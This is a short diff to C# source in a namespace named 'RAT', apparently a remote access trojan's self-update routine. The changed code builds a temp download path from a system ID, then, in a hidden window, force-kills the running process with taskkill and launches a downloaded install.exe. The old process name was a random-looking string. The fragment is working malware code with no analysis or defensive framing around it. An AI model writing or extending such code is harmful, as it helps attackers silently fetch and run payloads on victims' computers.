@@ -15,14 +15,13 @@ namespace RAT
             
             if(url.Contains("http://") || url.Contains("https://"))
             {
-                // URL is good
                 try
                 {
-                    File.Delete(Path.GetTempPath() + @"Updater\Downloads\install.exe");
+                    File.Delete(Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe");
                 }
                 catch
                 {
-                   // Fine just unable to remove file if it doesnt exsist!
+                    Directory.CreateDirectory(Path.GetTempPath() + Program.SystemID + @"\Downloads");
                 }
                 try
                 {
@@ -38,7 +37,7 @@ namespace RAT
                 {
                     if (close)
                     {
-                        String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe && " + Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe";
+                        String exec = " taskkill /f /im "+Program.ProccessName+"&& " + Path.GetTempPath() + Program.SystemID + @"\Downloads\install.exe";
                         System.Diagnostics.Process process = new System.Diagnostics.Process();
                         System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                         startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
